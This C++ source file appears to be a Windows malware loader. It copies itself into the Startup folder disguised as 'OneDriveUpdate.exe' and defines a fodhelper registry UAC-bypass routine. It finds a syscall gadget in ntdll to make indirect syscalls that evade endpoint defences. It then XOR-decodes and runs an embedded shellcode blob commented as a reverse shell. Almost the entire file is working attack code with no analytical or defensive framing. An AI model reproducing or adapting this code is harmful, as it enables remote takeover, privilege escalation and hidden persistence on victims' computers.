#include <windows.h>
#include <iostream>
#include <shlobj.h>

// --- 1. DEFINITIONS DES SIGNATURES ---

extern "C" void SetSyscallConfig(DWORD ssn, void* syscall_addr);

extern "C" NTSTATUS NtAllocateVirtualMemory(
    HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, 
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);

extern "C" NTSTATUS NtWriteVirtualMemory(
    HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, 
    SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);

extern "C" NTSTATUS NtCreateThreadEx(
    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
    HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument,
    ULONG CreateFlags, ULONG_PTR ZeroBits, SIZE_T StackSize,
    SIZE_T MaximumStackSize, PVOID AttributeList);

extern "C" NTSTATUS NtProtectVirtualMemory(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

void* GetSyscallGadget(HMODULE hNtdll) {
    unsigned char* pBase = (unsigned char*)hNtdll;
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);

    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)pSec[i].Name, ".text") == 0) {
            unsigned char* pStart = pBase + pSec[i].VirtualAddress;
            unsigned char* pEnd = pStart + pSec[i].Misc.VirtualSize;
            
            for (unsigned char* p = pStart; p < pEnd - 2; p++) {
                if (p[0] == 0x0F && p[1] == 0x05 && p[2] == 0xC3) {
                    return (void*)p;
                }
            }
        }
    }
    return NULL;
}

DWORD GetSSN(HMODULE hNtdll, const char* funcName) {
    void* funcAddr = (void*)GetProcAddress(hNtdll, funcName);
    if (!funcAddr) return -1;

    BYTE* p = (BYTE*)funcAddr;
    return (DWORD)p[4]; 
}

void UACBypass() {
    HKEY hKey;
    char szPath[MAX_PATH];
    
    if (GetModuleFileNameA(NULL, szPath, MAX_PATH) == 0) return;

    char cmd[MAX_PATH + 50];
    sprintf(cmd, "%s", szPath); 

    if (RegCreateKeyExA(HKEY_CURRENT_USER, 
        "Software\\Classes\\ms-settings\\Shell\\Open\\command", 
        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

        RegSetValueExA(hKey, "", 0, REG_SZ, (unsigned char*)cmd, strlen(cmd));

        RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (unsigned char*)"", 0);
        
        RegCloseKey(hKey);

        ShellExecuteA(NULL, "open", "fodhelper.exe", NULL, NULL, SW_HIDE);
    }
}

void InstallPersistence() {
    char szPath[MAX_PATH];
    char szDest[MAX_PATH];

    if (GetModuleFileNameA(NULL, szPath, MAX_PATH) == 0) return;

    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, szDest))) {
        
        strcat(szDest, "\\OneDriveUpdate.exe");

        CopyFileA(szPath, szDest, FALSE);
    }
}

// --- 3. MAIN ---

int main() {
    InstallPersistence();
    HMODULE hNtdll = GetModuleHandle("ntdll.dll");
    void* gadget = GetSyscallGadget(hNtdll);
    if (!gadget) return 1;

    //reverse shell
    unsigned char shellcode[] = {
    0x73, 0xc7, 0x0c, 0x6b, 0x7f, 0x67, 0x4f, 0x8f, 0x8f, 0x8f, 0xce, 0xde,
    0xce, 0xdf, 0xdd, 0xde, 0xd9, 0xc7, 0xbe, 0x5d, 0xea, 0xc7, 0x04, 0xdd,
    0xef, 0xc7, 0x04, 0xdd, 0x97, 0xc7, 0x04, 0xdd, 0xaf, 0xc7, 0x04, 0xfd,
    0xdf, 0xc7, 0x80, 0x38, 0xc5, 0xc5, 0xc2, 0xbe, 0x46, 0xc7, 0xbe, 0x4f,
    0x23, 0xb3, 0xee, 0xf3, 0x8d, 0xa3, 0xaf, 0xce, 0x4e, 0x46, 0x82, 0xce,
    0x8e, 0x4e, 0x6d, 0x62, 0xdd, 0xce, 0xde, 0xc7, 0x04, 0xdd, 0xaf, 0x04,
    0xcd, 0xb3, 0xc7, 0x8e, 0x5f, 0x04, 0x0f, 0x07, 0x8f, 0x8f, 0x8f, 0xc7,
    0x0a, 0x4f, 0xfb, 0xe8, 0xc7, 0x8e, 0x5f, 0xdf, 0x04, 0xc7, 0x97, 0xcb,
    0x04, 0xcf, 0xaf, 0xc6, 0x8e, 0x5f, 0x6c, 0xd9, 0xc7, 0x70, 0x46, 0xce,
    0x04, 0xbb, 0x07, 0xc7, 0x8e, 0x59, 0xc2, 0xbe, 0x46, 0xc7, 0xbe, 0x4f,
    0x23, 0xce, 0x4e, 0x46, 0x82, 0xce, 0x8e, 0x4e, 0xb7, 0x6f, 0xfa, 0x7e,
    0xc3, 0x8c, 0xc3, 0xab, 0x87, 0xca, 0xb6, 0x5e, 0xfa, 0x57, 0xd7, 0xcb,
    0x04, 0xcf, 0xab, 0xc6, 0x8e, 0x5f, 0xe9, 0xce, 0x04, 0x83, 0xc7, 0xcb,
    0x04, 0xcf, 0x93, 0xc6, 0x8e, 0x5f, 0xce, 0x04, 0x8b, 0x07, 0xc7, 0x8e,
    0x5f, 0xce, 0xd7, 0xce, 0xd7, 0xd1, 0xd6, 0xd5, 0xce, 0xd7, 0xce, 0xd6,
    0xce, 0xd5, 0xc7, 0x0c, 0x63, 0xaf, 0xce, 0xdd, 0x70, 0x6f, 0xd7, 0xce,
    0xd6, 0xd5, 0xc7, 0x04, 0x9d, 0x66, 0xd8, 0x70, 0x70, 0x70, 0xd2, 0xc6,
    0x31, 0xf8, 0xfc, 0xbd, 0xd0, 0xbc, 0xbd, 0x8f, 0x8f, 0xce, 0xd9, 0xc6,
    0x06, 0x69, 0xc7, 0x0e, 0x63, 0x2f, 0x8e, 0x8f, 0x8f, 0xc6, 0x06, 0x6a,
    0xc6, 0x33, 0x8d, 0x8f, 0x9e, 0xd3, 0x4f, 0x27, 0xea, 0x8e, 0xce, 0xdb,
    0xc6, 0x06, 0x6b, 0xc3, 0x06, 0x7e, 0xce, 0x35, 0xc3, 0xf8, 0xa9, 0x88,
    0x70, 0x5a, 0xc3, 0x06, 0x65, 0xe7, 0x8e, 0x8e, 0x8f, 0x8f, 0xd6, 0xce,
    0x35, 0xa6, 0x0f, 0xe4, 0x8f, 0x70, 0x5a, 0xdf, 0xdf, 0xc2, 0xbe, 0x46,
    0xc2, 0xbe, 0x4f, 0xc7, 0x70, 0x4f, 0xc7, 0x06, 0x4d, 0xc7, 0x70, 0x4f,
    0xc7, 0x06, 0x4e, 0xce, 0x35, 0x65, 0x80, 0x50, 0x6f, 0x70, 0x5a, 0xc7,
    0x06, 0x48, 0xe5, 0x9f, 0xce, 0xd7, 0xc3, 0x06, 0x6d, 0xc7, 0x06, 0x76,
    0xce, 0x35, 0x16, 0x2a, 0xfb, 0xee, 0x70, 0x5a, 0xc7, 0x0e, 0x4b, 0xcf,
    0x8d, 0x8f, 0x8f, 0xc6, 0x37, 0xec, 0xe2, 0xeb, 0x8f, 0x8f, 0x8f, 0x8f,
    0x8f, 0xce, 0xdf, 0xce, 0xdf, 0xc7, 0x06, 0x6d, 0xd8, 0xd8, 0xd8, 0xc2,
    0xbe, 0x4f, 0xe5, 0x82, 0xd6, 0xce, 0xdf, 0x6d, 0x73, 0xe9, 0x48, 0xcb,
    0xab, 0xdb, 0x8e, 0x8e, 0xc7, 0x02, 0xcb, 0xab, 0x97, 0x49, 0x8f, 0xe7,
    0xc7, 0x06, 0x69, 0xd9, 0xdf, 0xce, 0xdf, 0xce, 0xdf, 0xce, 0xdf, 0xc6,
    0x70, 0x4f, 0xce, 0xdf, 0xc6, 0x70, 0x47, 0xc2, 0x06, 0x4e, 0xc3, 0x06,
    0x4e, 0xce, 0x35, 0xf6, 0x43, 0xb0, 0x09, 0x70, 0x5a, 0xc7, 0xbe, 0x5d,
    0xc7, 0x70, 0x45, 0x04, 0x81, 0xce, 0x35, 0x87, 0x08, 0x92, 0xef, 0x70,
    0x5a, 0x34, 0x7f, 0x3a, 0x2d, 0xd9, 0xce, 0x35, 0x29, 0x1a, 0x32, 0x12,
    0x70, 0x5a, 0xc7, 0x0c, 0x4b, 0xa7, 0xb3, 0x89, 0xf3, 0x85, 0x0f, 0x74,
    0x6f, 0xfa, 0x8a, 0x34, 0xc8, 0x9c, 0xfd, 0xe0, 0xe5, 0x8f, 0xd6, 0xce,
    0x06, 0x55, 0x70, 0x5a
    };
    SIZE_T shellcodeSize = sizeof(shellcode);
    char key = 0x8F;

    for(int i=0; i<shellcodeSize; i++) {
        shellcode[i] = shellcode[i] ^ key;
    }

    HANDLE hProc = GetCurrentProcess();
    NTSTATUS status;

    DWORD ssnAlloc = GetSSN(hNtdll, "NtAllocateVirtualMemory");
    SetSyscallConfig(ssnAlloc, gadget);
    
    void* allocAddr = NULL;
    SIZE_T size = shellcodeSize;
    status = NtAllocateVirtualMemory(hProc, &allocAddr, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0) return 1;

    // --- 4. ECRITURE ---
    DWORD ssnWrite = GetSSN(hNtdll, "NtWriteVirtualMemory");
    SetSyscallConfig(ssnWrite, gadget);
    
    SIZE_T bytesWritten = 0;
    NtWriteVirtualMemory(hProc, allocAddr, shellcode, shellcodeSize, &bytesWritten);

    DWORD ssnProtect = GetSSN(hNtdll, "NtProtectVirtualMemory");
    SetSyscallConfig(ssnProtect, gadget);

    ULONG oldProtect = 0;
    status = NtProtectVirtualMemory(hProc, &allocAddr, &size, PAGE_EXECUTE_READ, &oldProtect);
    if (status != 0) return 1;

    DWORD ssnThread = GetSSN(hNtdll, "NtCreateThreadEx");
    SetSyscallConfig(ssnThread, gadget);

    HANDLE hThread = NULL;
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProc, allocAddr, NULL, FALSE, 0, 0, 0, NULL);

    WaitForSingleObject(hThread, INFINITE);
    return 0;
}